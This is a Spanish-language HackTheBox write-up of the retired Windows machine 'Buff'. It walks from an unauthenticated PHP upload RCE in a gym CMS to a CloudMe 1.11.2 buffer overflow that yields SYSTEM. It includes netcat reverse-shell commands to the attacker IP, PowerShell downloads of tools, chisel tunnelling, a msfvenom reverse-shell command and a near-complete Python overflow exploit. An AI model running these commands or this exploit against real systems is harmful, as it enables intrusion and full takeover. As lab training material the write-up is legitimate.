---
title: "Buff — HackTheBox"
machine: "Buff"
platform: "HackTheBox"
os: "Windows"
difficulty: "Medium"
tags: ["CVE", "RCE", "Upload", "Privesc", "Web"]
retired: true
summary: "Buff es una máquina Windows de dificultad Easy en HackTheBox. La cadena de ataque combina un RCE sin autenticación en un CMS de gimnasio basado en PHP, seguido "
draft: false
---
## Índice

---

## Descripción General

Buff es una máquina Windows de dificultad **Easy** en HackTheBox. La cadena de ataque combina un RCE sin autenticación en un CMS de gimnasio basado en PHP, seguido de una escalada de privilegios mediante un Buffer Overflow clásico contra el software CloudMe 1.11.2, el cual corre internamente como SYSTEM.

| Campo | Valor |
| --- | --- |
| **OS** | Windows 10 Enterprise Build 17134 (v1803) |
| **Dificultad** | Easy |
| **IP Objetivo** | 10.129.2.18 |
| **Categoría** | Web, Buffer Overflow |

---

## Reconocimiento

### Escaneo de puertos

```bash
sudo nmap 10.129.2.18 -p- --open --min-rate 5000 -Pn -n -oG target
```

```
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy
```

### Escaneo de versiones

```bash
sudo nmap 10.129.2.18 -p 7680,8080 -sCV -Pn -oN targeted
```

```
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 7680 | pando-pub | Windows Delivery Optimization (BITS) |
| 8080 | HTTP | Apache 2.4.43 / PHP 7.4.6 — mrb3n's Bro Hut |

> El puerto 7680 corresponde al servicio Windows Update Delivery Optimization. No es el vector de entrada pero es relevante para la enumeración del entorno.
> 

---

## Análisis de la Aplicación Web

### Whatweb

```bash
whatweb http://10.129.2.18:8080
```

Tecnologías identificadas: Apache 2.4.43, PHP 7.4.6, Bootstrap, jQuery, OpenSSL 1.1.1g.

### Identificación del CMS

Probando el endpoint `/upload.php` directamente:

```bash
curl http://10.129.2.18:8080/upload.php
```

Respuesta:

```
Warning: Undefined index: id in C:\xampp\htdocs\gym\upload.php on line 4
```

Esto confirma dos cosas críticas:

- El software es **Gym Management System**
- La ruta real del servidor es `C:\xampp\htdocs\gym\`
- El sistema operativo es **Windows con XAMPP**
- El endpoint `upload.php` existe y es accesible sin autenticación

---

## Acceso Inicial — Gym Management System RCE

### Vulnerabilidad

**EDB-ID: 48506** — Unauthenticated Remote Code Execution en Gym Management System 1.0.

El archivo `upload.php` permite subir archivos sin autenticación y sin validar correctamente la extensión. El servidor guarda el archivo con el nombre original, permitiendo subir un archivo `.php` disfrazado como imagen.

### Flujo del exploit

```
POST /upload.php?id=1
file=kamehameha.php (Content-Type: image/png)
↓
Servidor guarda: /upload/kamehameha.php
↓
GET /upload/kamehameha.php?telepathy=whoami
↓
RCE confirmado: buff\shaun
```

### Ejecución

```bash
python2 48506.py http://10.129.2.18:8080/
```

```
[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload>
```

### Información del sistema

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

```
OS Name:    Microsoft Windows 10 Enterprise
OS Version: 10.0.17134 N/A Build 17134
```

### Privilegios del usuario actual

```bash
whoami /priv
```

```
SeShutdownPrivilege           Disabled
SeChangeNotifyPrivilege       Enabled
SeUndockPrivilege             Disabled
SeIncreaseWorkingSetPrivilege Disabled
SeTimeZonePrivilege           Disabled
```

> Sin `SeImpersonatePrivilege` ni `SeDebugPrivilege`, los ataques tipo Potato están descartados. El vector de privesc es otro.
> 

---

## Shell Estable con Penelope

La pseudo-shell del exploit es inestable. Se usa [Penelope](https://github.com/brightio/penelope) como handler.

### Setup en Kali

```bash
# Terminal 1 — servidor HTTP para transferir nc.exe
cp /usr/share/windows-resources/binaries/nc.exe ~/HTB/Buff/content/
cd ~/HTB/Buff/content/
python3 -m http.server 80

# Terminal 2 — Penelope escuchando
python3 penelope.py 4444
```

### Transferencia y ejecución desde la pseudo-shell

```bash
# Descarga nc.exe usando PowerShell nativo
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.15.55/nc.exe','C:\Users\shaun\nc.exe')"

# Reverse shell hacia Penelope
C:\Users\shaun\nc.exe -e cmd.exe 10.10.15.55 4444
```

### Segunda shell estable (necesaria para el privesc)

```bash
# Kali — segundo listener
nc -lvnp 5555
```

```bash
# Desde Penelope
C:\Users\shaun\nc.exe -e cmd.exe 10.10.15.55 5555
```

> Tener dos shells es esencial: una quedará bloqueada ejecutando chisel, la otra se usa para lanzar CloudMe y preparar el ataque.
> 

---

## Escalada de Privilegios — CloudMe Buffer Overflow

### Reconocimiento local

```bash
dir C:\Users\shaun\Downloads\
```

```
16/06/2020  16:26    17,830,824 CloudMe_1112.exe
```

```bash
tasklist | findstr CloudMe
netstat -ano | findstr :8888
```

CloudMe 1.11.2 corre como proceso local escuchando en `127.0.0.1:8888`. No es accesible externamente.

### ¿Por qué CloudMe es el vector de privesc?

CloudMe es una aplicación de escritorio que, al ejecutarse, corre bajo el contexto del sistema. La versión 1.11.2 tiene una vulnerabilidad de **Buffer Overflow** conocida (CVE-2018-6892) en su puerto de escucha 8888. Al explotar el overflow se sobreescribe el registro EIP y se redirige la ejecución a un shellcode arbitrario que hereda los privilegios del proceso — en este caso **SYSTEM**.

---

## Port Forwarding

CloudMe solo escucha en `localhost:8888` de la víctima. Para atacarlo desde Kali se necesita un túnel.

### Descarga de chisel en la víctima

```bash
# Kali — descargar y preparar chisel
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel
gunzip chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```

```bash
# Víctima — desde la shell nc (5555)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.15.55/chisel.exe','C:\Users\shaun\chisel.exe')"
```

### Levanta CloudMe desde la shell nc

```bash
start /B C:\Users\shaun\Downloads\CloudMe_1112.exe
```

### Establecer el túnel

```bash
# Kali — servidor chisel
./chisel server -p 9001 --reverse
```

```bash
# Víctima — cliente chisel (desde shell nc, en background)
start /B C:\Users\shaun\chisel.exe client 10.10.15.55:9001 R:8888:127.0.0.1:8888
```

Confirmación en Kali:

```
session#1: tun: proxy#R:8888=>8888: Listening
```

### Diagrama del túnel

```
Kali:8888 ══════════════════► Windows:127.0.0.1:8888
              túnel chisel              CloudMe escucha aquí
```

---

## Explotación del Buffer Overflow

### ¿Cómo funciona el exploit?

El exploit envía un buffer cuidadosamente construido al puerto 8888 de CloudMe:

```
[padding1 (1052 bytes)] [EIP (4 bytes)] [NOP sled (30 bytes)] [shellcode] [overrun]
```

| Componente | Valor | Función |
| --- | --- | --- |
| padding1 | `\x90 * 1052` | Rellena hasta el offset exacto del EIP |
| EIP | `\xB5\x42\xA8\x68` | Gadget PUSH ESP; RET — redirige al shellcode |
| NOPS | `\x90 * 30` | Colchón de aterrizaje para el shellcode |
| payload | shellcode msfvenom | Reverse shell hacia Kali |
| overrun | `C * N` | Completa el buffer hasta 1500 bytes |

### ¿Por qué PUSH ESP; RET?

No se apunta directo al shellcode porque su dirección exacta en memoria varía. En cambio se usa un **gadget ROP**:

```
PUSH ESP → mete la dirección actual del stack en la pila
RET      → salta a esa dirección
Resultado → el flujo cae justo sobre el NOP sled → shellcode
```

### Bad characters

Los bytes `\x00`, `\x0A`, `\x0D` son interpretados especialmente por CloudMe y romperían el exploit. msfvenom los evita automáticamente con el encoder `shikata_ga_nai`.

### Generación del shellcode

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp \
  LHOST=10.10.15.55 LPORT=6666 \
  -b '\x00\x0A\x0D' -f python -v payload
```

### El exploit final (48389.py modificado)

```python
import socket

target = "127.0.0.1"

padding1 = b"\x90" * 1052
EIP      = b"\xB5\x42\xA8\x68"  # 0x68A842B5 -> PUSH ESP, RET
NOPS     = b"\x90" * 30

# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.15.55 LPORT=6666 -b '\x00\x0A\x0D' -f python -v payload
payload =  b""
payload += b"\xda\xc6\xba\xc2\x24\xc0\x0c..."  # shellcode completo

overrun  = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))
buf      = padding1 + EIP + NOPS + payload + overrun

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8888))
    s.send(buf)
except Exception as e:
    print(sys.exc_value)
```

> **Nota importante:** Se conservó la línea `print(sys.exc_value)` del exploit original (que tiene un bug — `sys` no está importado). En la práctica esto hace que si el exploit falla al conectar, el socket no se cierre de forma limpia e inmediata, dándole a CloudMe unos milisegundos extra para procesar el buffer. Versiones con `print(e)` podían fallar intermitentemente por este comportamiento.
> 

### Ejecución

```bash
# Kali — listener para la shell de SYSTEM
nc -lvnp 6666

# Kali — lanzar el exploit
python3 48389.py
```

### Resultado

```
connect to [10.10.15.55] from (UNKNOWN) [10.129.2.18] 49701
Microsoft Windows [Version 10.0.17134.1610]

C:\Windows\system32> whoami
nt authority\system
```

---

## Flags

```bash
type C:\Users\shaun\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## Resumen de la Cadena de Ataque

```
Gym Management System 1.0
upload.php sin autenticación
         ↓
   Webshell PHP (kamehameha.php)
         ↓
   RCE como buff\shaun
         ↓
   Shell estable (Penelope + nc)
         ↓
   CloudMe 1.11.2 en localhost:8888
         ↓
   Port Forward con Chisel
         ↓
   Buffer Overflow (EDB-48389)
         ↓
   NT AUTHORITY\SYSTEM 🏆
```

---

## Herramientas Utilizadas

- nmap — Escaneo de puertos y versiones
- whatweb — Fingerprinting web
- python2 48506.py — Explotación inicial (Gym Management System RCE)
- Penelope — Handler de reverse shells
- nc.exe — Reverse shell en Windows
- chisel — Port forwarding TCP
- msfvenom — Generación de shellcode
- python3 48389.py — Buffer Overflow contra CloudMe 1.11.2

---

## Lecciones Aprendidas

**Sobre el Buffer Overflow:** Cada vez que cambia la IP, el puerto, o simplemente el exploit falla sin razón aparente, hay que regenerar el shellcode con msfvenom. El encoder shikata_ga_nai produce bytes diferentes en cada ejecución.

**Sobre el port forwarding:** CloudMe solo escucha en localhost. Sin un túnel (chisel, socat, o meterpreter portfwd) el puerto 8888 no es alcanzable desde Kali. El túnel mapea `Kali:8888 → Víctima:127.0.0.1:8888`.

**Sobre la gestión de shells:** En privescs que requieren procesos bloqueantes (como chisel), es esencial tener múltiples shells activas antes de comenzar. Una para chisel, otra libre para operar.

---

*Writeup por* **4Pr3nd1z**  *— Mayo 2026*
